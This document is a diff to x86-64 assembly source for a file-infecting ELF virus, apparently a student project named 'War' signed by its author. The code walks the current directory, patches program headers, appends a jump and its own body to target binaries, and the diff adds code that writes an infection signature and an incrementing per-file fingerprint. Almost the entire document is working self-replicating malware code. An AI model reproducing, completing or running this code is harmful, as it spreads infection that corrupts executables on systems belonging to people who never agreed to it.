@@ -12,6 +12,8 @@ _start:
   sub rsp, STACK_SIZE ; 
   mov r15, rsp ; r15 will be the base of our stack
 
+  mov DWORD [r15 + FINGERPRINT_ADD], 0 ; initialize to 0
+
   ; --- Open "."
   push "." ; push "." to stack (rsp)
   mov rdi, rsp
@@ -166,8 +168,8 @@ _start:
       mov [r15 + PHDR_VADDR], r13 ; change vaddr to (stat.st_size + VADDR)
 
       mov qword [r15 + PHDR_ALIGN], ALIGN ; make sure alignment is correct ; SCOTT check
-      add qword [r15 + PHDR_FILESZ], v_stop - _start + JMP_REL_SIZE ; adjust filesize. Add + 5 because of jmp instruction
-      add qword [r15 + PHDR_MEMSZ], v_stop - _start + JMP_REL_SIZE ; adjust memsize. Add + 5 because of jmp instruction.
+      add qword [r15 + PHDR_FILESZ], v_stop - _start + JMP_REL_SIZE; + signature_len + fingerprint_len ; adjust filesize. Add + 5 because of jmp instruction
+      add qword [r15 + PHDR_MEMSZ], v_stop - _start + JMP_REL_SIZE; + signature_len + fingerprint_len ; adjust memsize. Add + 5 because of jmp instruction.
 
       ; -- Write the patched header
       ; pwrite(fd, buf, count, offset)
@@ -220,13 +222,65 @@ _start:
       ; Write patched jmp to EOF
       mov rdi, r9 ; load fd
       lea rsi, [r15 + JMP_REL] ; rsi = patched jmp in stack buffer
+      mov r10, rax ; load EOF
       mov rdx, JMP_REL_SIZE ; size of jmp rel
-      mov r10, rax ; load new target EOF
       mov rax, SYS_PWRITE64
       syscall
 
       cmp rax, 0
       jl .close_and_next_file ; if error continue
+
+      ; Write signature
+      mov rdi, r9 ; load fd
+      xor rsi, rsi ; offset 0
+      mov rdx, SEEK_END ; end of the file
+      mov rax, SYS_LSEEK
+      syscall
+
+      lea rsi, [rbp + signature] ; load signature in rsi
+      xor r12, r12 ; init rcx
+      cmp byte [rsi + 1], 'W'; check if we need to adjust offset
+      je .after
+      add r12, signature - v_stop + 1 ; add the difference
+
+      .after:
+        add rsi, r12 ; adjust pointer (r12 will be 0 if rsi + 1 == 'W')
+        mov rdx, signature_len ; signature length
+        mov r10, rax
+        mov rax, SYS_PWRITE64
+        syscall
+
+      cmp rax, 0
+      jl .close_and_next_file ; if error go to next file
+
+      ; Load fingerprint and write it
+      lea rsi, [rbp + fingerprint] ; load fingerprint address in rsi
+      add rsi, r12 ; adjust pointer
+
+
+      mov eax, [rsi] ; load fingerprint
+      mov ebx, [r15 + FINGERPRINT_ADD] ; load how much we should increment
+      ; need to create function to properly increment
+      inc ebx ; increment SCOTT remove
+      mov [r15 + FINGERPRINT_ADD], ebx ; store it back
+      add eax, ebx ; add it to eax
+      mov [r15 + FINGERPRINT], eax ; store fingerprint
+
+      ; -- Get to the end of the file
+      mov rdi, r9 ; load fd
+      xor rsi, rsi ; offset 0
+      mov rdx, SEEK_END ; end of the file
+      mov rax, SYS_LSEEK
+      syscall
+
+      lea rsi, [r15 + FINGERPRINT] ; load address
+      mov r10, rax ; load EOF in rax
+      mov rdx, 4 ; want to write 4 bytes
+      mov rax, SYS_PWRITE64
+      syscall
+
+      cmp rax, 0
+      jl .close_and_next_file ; if error go to next file
 
       mov rax, SYS_SYNC ; committing filesystem caches to disk
       syscall
@@ -235,7 +289,6 @@ _start:
       mov rdi, r9 ; load fd from r9
       mov rax, SYS_CLOSE
       syscall
-      jmp .next_file
 
     .next_file:
       pop rcx ; restore rcx that we previously stored
@@ -243,13 +296,13 @@ _start:
       cmp rcx, [r15 + DIR_SIZE]
       jl .loop_directory
 
-call show_msg
+call show_msg ; pushing db 'salut salut' on stack
 info_msg:
   db 'SALUT SALUT', 0xa
   info_len equ $ - info_msg
 
   show_msg:
-    pop rsi
+    pop rsi ; popping 'salut salut' in rsi
     mov rax, SYS_WRITE
     mov rdi, STDOUT
     mov rdx, info_len
@@ -262,6 +315,15 @@ cleanup:
   pop rdx ; restore rdx
 
 v_stop:
+  jmp exit
+signature:
+  db 0, 'War version 1.0 (c)oded by pscott - '
+  signature_len equ $ - signature
+fingerprint:
+	db 0x42, 0x42, 0x42, 0x42, 0
+  fingerprint_len equ $ - fingerprint
+
+exit:
   xor rdi, rdi ; exit code 0
   mov rax, SYS_EXIT;
   syscall
